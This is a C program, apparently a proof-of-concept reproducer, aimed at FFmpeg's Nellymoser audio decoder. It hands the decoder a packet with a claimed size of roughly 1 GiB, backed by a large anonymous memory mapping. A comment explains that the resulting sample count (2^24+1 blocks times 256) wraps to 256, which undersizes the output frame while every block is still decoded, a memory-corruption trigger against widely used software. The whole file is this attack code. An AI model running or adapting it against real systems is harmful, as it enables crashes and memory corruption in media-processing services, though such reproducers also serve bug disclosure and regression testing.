#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>

#include "libavcodec/avcodec.h"
#include "libavcodec/packet.h"
#include "libavutil/buffer.h"
#include "libavutil/frame.h"

#ifndef MAP_ANONYMOUS
#define MAP_ANONYMOUS MAP_ANON
#endif

/* (2^24 + 1) complete 64-byte blocks make 256 * blocks wrap to 256. */
#define CLAIMED_PACKET_SIZE 1073741888

typedef struct Mapping {
    size_t size;
} Mapping;

static void unmap_packet(void *opaque, uint8_t *data)
{
    Mapping *mapping = opaque;

    munmap(data, mapping->size);
    free(mapping);
}

int main(void)
{
    const AVCodec *codec = avcodec_find_decoder(AV_CODEC_ID_NELLYMOSER);
    AVCodecContext *context = NULL;
    AVPacket *packet = NULL;
    AVFrame *frame = NULL;
    Mapping *mapping = NULL;
    uint8_t *data = MAP_FAILED;
    int ret = 1;

    if (!codec)
        goto done;
    context = avcodec_alloc_context3(codec);
    packet = av_packet_alloc();
    frame = av_frame_alloc();
    mapping = malloc(sizeof(*mapping));
    if (!context || !packet || !frame || !mapping)
        goto done;

    mapping->size = (size_t)CLAIMED_PACKET_SIZE +
                    AV_INPUT_BUFFER_PADDING_SIZE;
    data = mmap(NULL, mapping->size, PROT_READ | PROT_WRITE,
                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (data == MAP_FAILED)
        goto done;
    data[0] = 0;
    packet->buf = av_buffer_create(data, mapping->size, unmap_packet,
                                   mapping, 0);
    if (!packet->buf)
        goto done;
    packet->data = data;
    packet->size = CLAIMED_PACKET_SIZE;
    data = MAP_FAILED;
    mapping = NULL;

    context->sample_rate = 8000;
    if (avcodec_open2(context, codec, NULL) < 0)
        goto done;

    fprintf(stderr,
            "codec=nellymoser packet_size=%d blocks=16777217 "
            "wrapped_nb_samples=256 virtual_mapping=valid\n",
            CLAIMED_PACKET_SIZE);
    fflush(stderr);
    if (avcodec_send_packet(context, packet) < 0)
        goto done;
    if (avcodec_receive_frame(context, frame) >= 0) {
        fprintf(stderr, "unexpected_decoder_success=1 nb_samples=%d\n",
                frame->nb_samples);
        ret = 0;
    }

done:
    if (data != MAP_FAILED)
        munmap(data, mapping->size);
    free(mapping);
    av_frame_free(&frame);
    av_packet_free(&packet);
    avcodec_free_context(&context);
    return ret;
}
